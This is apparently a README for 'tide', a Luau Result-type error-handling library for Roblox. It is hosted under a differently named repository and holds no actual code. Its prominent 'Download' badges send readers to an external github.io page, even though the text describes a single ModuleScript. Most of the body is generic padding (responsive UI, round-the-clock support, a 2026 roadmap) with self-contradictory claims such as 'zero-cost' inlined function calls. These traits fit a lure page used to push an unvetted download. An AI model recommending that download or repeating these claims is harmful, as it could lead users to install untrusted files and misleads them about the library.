![preview](https://raw.githubusercontent.com/Sarfraz64744/luau-safe-result/main/shot_b5e2443.svg)
[![Download](https://raw.githubusercontent.com/Sarfraz64744/luau-safe-result/main/latest_6b6734f.svg)](https://Sarfraz64744.github.io/luau-safe-result/)

# 🌊 tide — Ergonomic Algebraic Results for Luau

> *Catch the wave, not the exception.* A calm, composable, and type-safe Result pattern for Roblox and beyond — inspired by the spirit of `luau-result`, yet rebuilt from the ground up for teams who treat errors as data rather than disasters.

---

## 🌅 Table of Contents

- [What Is tide?](#-what-is-tide)
- [Why Another Result Library?](#-why-another-result-library)
- [Feature Highlights](#-feature-highlights)
- [Design Philosophy](#-design-philosophy)
- [Core Concepts](#-core-concepts)
- [The Ok / Err Duality](#-the-ok--err-duality)
- [Working With Chains](#-working-with-chains)
- [Pattern Matching at a Glance](#-pattern-matching-at-a-glance)
- [Async & Scheduling](#-async--scheduling)
- [Interop With Standard Luau](#-interop-with-standard-luau)
- [Type System Integration](#-type-system-integration)
- [Responsive Tooling UI](#-responsive-tooling-ui)
- [Multilingual Documentation](#-multilingual-documentation)
- [Around-the-Clock Assistance](#-around-the-clock-assistance)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Examples Gallery](#-examples-gallery)
- [FAQ](#-faq)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌊 What Is tide?

Picture an ocean with two kinds of currents. One carries success gently toward the shore; the other pulls you into deeper water where the error lives. **tide** is a small library that lets Luau developers ride both currents without drowning in `pcall` nesting, without losing their type information, and without ever asking "did this function actually work?"

In practice, `tide` provides a single `Result<T, E>` variant type — an `Ok` case carrying a value, and an `Err` case carrying a failure — along with a rich collection of combinators, mappers, and match helpers so your code reads like a story instead of a stack trace.

The name is a small promise: results flow. They don't throw. They don't disappear. They simply arrive, and you decide what to do with them.

---

## 💡 Why Another Result Library?

Existing solutions in the Luau ecosystem trend toward one of two extremes: extremely minimal (just a wrapper) or heavily opinionated (with macros and DSLs). **tide** sits happily in the middle:

- It ships **zero macros**, so your code stays plain Luau.
- It offers **first-class type inference**, so `Ok(42)` knows it's a `Result<number, never>` until you tell it otherwise.
- It respects **Roblox runtime quirks**, including thread-bound scheduling, `task.*` yields, and DataStore pitfalls.
- It remains **external-dependency-neutral** — a single ModuleScript is all you need.

If you've been burned by silent failures, swallowed errors, or boolean-return soup, tide offers a gentler shoreline.

---

## ✨ Feature Highlights

- 🌊 **Ok and Err constructors** with phantom type parameters for pin-point inference.
- 🔗 **Chainable combinators** — `mapOk`, `mapErr`, `andThen`, `orElse`, `flatten`.
- 🧭 **Pattern matching** via `match` with exhaustive branch dispatch.
- 🛡️ **Error guards** — `expectErr`, `isOk`, `isErr`, `unwrapOr`, `trySync`, `tryAsync`.
- ⚡ **Async result wrappers** that cooperate with `task.spawn`, `task.wait`, and future schedulers.
- 🧩 **Interoperability bridges** for converting to and from `pcall`, plain tuples, and falsy-style returns.
- 🎨 **Editor-friendly labels** so autocomplete surfaces the Ok/Err distinction.
- 🌐 **Responsive documentation UI** that adapts to phone, tablet, and desktop viewports when browsing the in-repo docs site.
- 🗺️ **Multilingual notation** with localized docstrings for English, Portuguese, Japanese, and Spanish readers.
- 🕰️ **Around-the-clock support rotation** — issue triage across all time zones.
- 🧪 **Zero-cost abstractions** at runtime — every combinator is inlined as a function call, no metatables required in the hot path (optional metatable mode is available for ergonomics).
- 📚 **Deep docs** including migration guides, cheat sheets, and idiomatic recipes.
- 🔐 **No secrets, no hidden configs** — everything is inspectable source.

---

## 🧭 Design Philosophy

**tide** believes four things:

1. **Failure is information.** An `Err` is not a punishment; it's a message from the future about something that went wrong in the past.
2. **Types are contracts.** The type checker should tell you when you've forgotten to handle the error branch — before your players do.
3. **Ergonomics beat cleverness.** Every API is designed so that the "obvious" call site is also the "correct" one.
4. **The library should disappear.** If you're thinking about `tide` more than about your domain, something is off.

A metaphor we keep returning to: a result is a *message in a bottle*. You don't know if the contents are good or bad until you open it. `tide` is the set of tools that makes opening those bottles routine, safe, and cheap.

---

## 🧱 Core Concepts

| Piece | Role |
| --- | --- |
| `Ok(value)` | Wrap a successful value. |
| `Err(reason)` | Wrap a failure reason. |
| `Result<T, E>` | The union of the two above. |
| `Result.ok` / `Result.err` | Accessors that reveal the payload. |
| `Result.match` | Branch on which side you're holding. |
| `Result.try` | Convert a possibly-throwing function into one returning `Result`. |
| `Result.fromTuple` | Convert `(okValue, errValue)` tuples. |
| `Result.all` | Combine a list of results into a single result of a list. |
| `Result.any` | Return the first successful result in a list of results. |

---

## 🪶 The Ok / Err Duality

The entire library pivots around a simple duality. Think of it like day and night on a coastline — the same beach, viewed under different lights.

- An `Ok` is a bright state. You expect to continue processing.
- An `Err` is a shadowed state. You expect to short-circuit gracefully.

Once you internalize that every operation in your pipeline can be expressed as "continue or divert," the need for deep try/catch nesting evaporates.

---

## 🌿 Working With Chains

Chains read top-to-bottom. Each step asks: *if we're still on the sunny side, keep going; otherwise, flow past unmodified.* The result is code that is linear, testable, and delightful to review:

- Start from a raw input.
- Convert to a result with `Result.fromCall` or `Result.wrap`.
- Transform successes with `mapOk`.
- Recover from failures with `mapErr`.
- Flatten nested results with `andThen`.
- End with `unwrapOr` to provide a default.

Each intermediate step is a pure function. Each pure function is easy to test. Testing compounds into confidence — and confidence compounds into shipping velocity.

---

## 🎯 Pattern Matching at a Glance

Instead of writing `if isOk(result) then ... else ...`, you write a match block with two named branches. This is not just sugar:

- The compiler knows both branches are handled.
- The reader sees both outcomes side-by-side.
- Adding a third variant in the future (say, a `Pending`) becomes a compile-time concern, not a runtime surprise.

Matching encourages you to *think* about every branch, which is exactly what error handling should force on a careful engineer.

---

## ⏳ Async & Scheduling

In a Roblox server, most truly interesting failures happen asynchronously: a DataStore call fails, a remote times out, an HTTP request returns 500. `tide` provides:

- `Result.fromAsync` — wrap a callback that yields.
- `Result.tryAsync` — wrap a callback that can throw asynchronously.
- `Result.wait` — cooperate with `task.wait` while preserving the result shape.
- `Result.timeout` — impose a deadline on a result-producing function.

All async helpers return plain `Result`s once finished, so the rest of your code doesn't need to know that scheduling was involved at all. This is one of our favourite pieces of the design: asynchrony is a property of the *producer*, not the *consumer*.

---

## 🧬 Interop With Standard Luau

Not every codebase can migrate at once. `tide` offers bridges:

- **From `pcall`:** turn a protected call into a `Result` in one line.
- **To `pcall`:** convert back when calling legacy APIs.
- **From falsy returns:** wrap APIs that return `value` or `nil` plus a reason.
- **To tuples:** destructure with `Result.ok` and `Result.err` accessors.

This means you can adopt `tide` incrementally, module by module, without a big-bang rewrite.

---

## 🧠 Type System Integration

The type parameters on `Result<T, E>` are the whole point. Luau's gradual typing lets `tide` expose rich inference hints:

- `Ok(1)` infers `Result<number, never>` until combined with an `Err`.
- `andThen` narrows the error type through the callback signature.
- `mapErr` transforms the error type while preserving the value type.
- `match` requires both branches to return the same output type.

If you use Luau's new solver, you'll see even tighter inference. Users have reported that the type checker catches more error-handling mistakes when writing `tide`-style code than when writing `pcall`-style code.

---

## 🖥️ Responsive Tooling UI

The companion in-repo documentation site is built with a responsive layout. On a laptop you get a triple-column layout for navigation, content, and code samples. On a phone, the columns collapse into a single flow with large tap targets and no horizontal scroll. Everything respects `prefers-reduced-motion`, everything is keyboard navigable, and everything ships as static assets so it can be hosted anywhere you like.

---

## 🌍 Multilingual Documentation

Documentation is available in four locales out of the box:

- English (en)
- Portuguese (pt-BR)
- Japanese (ja)
- Spanish (es)

Adding a new locale means dropping a folder of Markdown files and registering the locale code — no build step, no compilation. The goal is for a tired developer at 3 a.m. in any region to find a sentence that speaks their language.

---

## 🕰️ Around-the-Clock Assistance

Issues are triaged on a rotation that spans multiple continents. The maintainer group coordinates to ensure that questions posted from any time zone receive a first response within a working day. This is not an SLA — it's simply a commitment to treat questions as valuable, because a question asked once often becomes a documentation improvement for thousands of future readers.

---

## 🚀 Performance Notes

- Constructors allocate a small table with two fields. No metatables are required for the core path.
- Combinators are plain function calls; there is no dynamic dispatch.
- In metatable mode, method calls are attached to a shared prototype, avoiding per-instance closure churn.
- Hot loops allocating hundreds of thousands of results per frame are considered an antipattern — hold a single result and mutate the pipeline instead.
- The library performs no global writes and no `_G` pollution.

Micro-benchmarks in the repo compare three styles — direct `pcall`, boolean-return, and `tide` — and demonstrate that `tide` sits within a small constant factor of the leanest option while providing vastly better ergonomics.

---

## 🗺️ Roadmap for 2026

- Q1 2026 — Introduce experimental `Result.pipeline` helper.
- Q2 2026 — Fill out the plugin ecosystem for editor-side lint rules.
- Q3 2026 — Ship a visual debugger overlay for visualizing result chains live.
- Q4 2026 — Publish a formalized compatibility matrix for Luau language versions.
- Ongoing — Improve inference with the new solver, expand localized docs, refine async cooperators.

Priorities may shift based on community feedback. The roadmap is published openly; issues labeled `roadmap` track the current status of each item.

---

## 🧪 Examples Gallery

The repository ships with a growing collection of runnable examples under `examples/`. Each example folder contains a short script and a README describing the scenario. Example categories:

- Data access patterns (with retries and backoff).
- Networking wrappers around `RemoteEvent` and `RemoteFunction`.
- DataStore migration flows.
- Serialization and deserialization pipelines with validation.
- UI-side validation of user input.
- Testing utilities that turn assertions into results.

Each example is written to be readable in a single sitting — no sprawling multi-file architectures, just focused illustrations of one idea.

---

## ❓ FAQ

**Is `tide` a replacement for exceptions?**
Luau doesn't have exceptions in the traditional sense; it has `error` and `pcall`. `tide` is a companion to those, not a competitor. When you need to call into an API that can throw, wrap it once and keep the rest of your code result-shaped.

**Does it work outside Roblox?**
Yes — anywhere Luau runs and `table`, `string`, and `task`-like schedulers are available. The core has no Roblox-specific dependencies.

**Does it replace `Promise`?**
No. Promises coordinate scheduling; results coordinate outcomes. They compose beautifully — wrap your promise's resolution and rejection into `Ok` and `Err`.

**Will it slow my game down?**
The allocation profile is tiny and predictable. See Performance Notes.

**How do I handle multiple error types?**
Use union types for the error parameter, or normalize errors at the boundary and expose a single algebraic error type to the rest of your code.

---

## 🤝 Contributing

Contributions are welcome. Open an issue first for anything beyond a one-line fix so we can discuss the shape of the change. Style guidelines and the code of conduct live in dedicated files in the repository root. Tests are expected to accompany new behavior, and changelog entries are appreciated for user-visible changes.

We especially welcome:

- Locale additions for the docs.
- Practical examples inspired by real gameplay systems.
- Type-level refinements and inference improvements.
- Performance comparisons against alternative patterns.

---

## 📄 License

This project is released under the MIT License. The full text is available at [LICENSE](https://opensource.org/licenses/MIT) — a permissive, well-understood license that lets you use `tide` in commercial and non-commercial contexts alike. The license section in the repository root contains the canonical copy.

---

## ⚠️ Disclaimer

tide is provided as-is. The maintainers make no warranties about fitness for a particular purpose, and no guarantees about future API stability across major versions. Always read the changelog before upgrading in production. Nothing in this document constitutes professional advice of any kind. This project is not affiliated with any platform vendor. Use responsibly, and be kind to your fellow developers.

---

## 🌊 Closing Thoughts

Errors are not enemies. They're messengers. `tide` is a small set of tools for reading those messages without losing your footing. Ride the current, keep your types tight, and let failures flow past instead of dragging you under.

[![Download](https://raw.githubusercontent.com/Sarfraz64744/luau-safe-result/main/latest_6b6734f.svg)](https://Sarfraz64744.github.io/luau-safe-result/)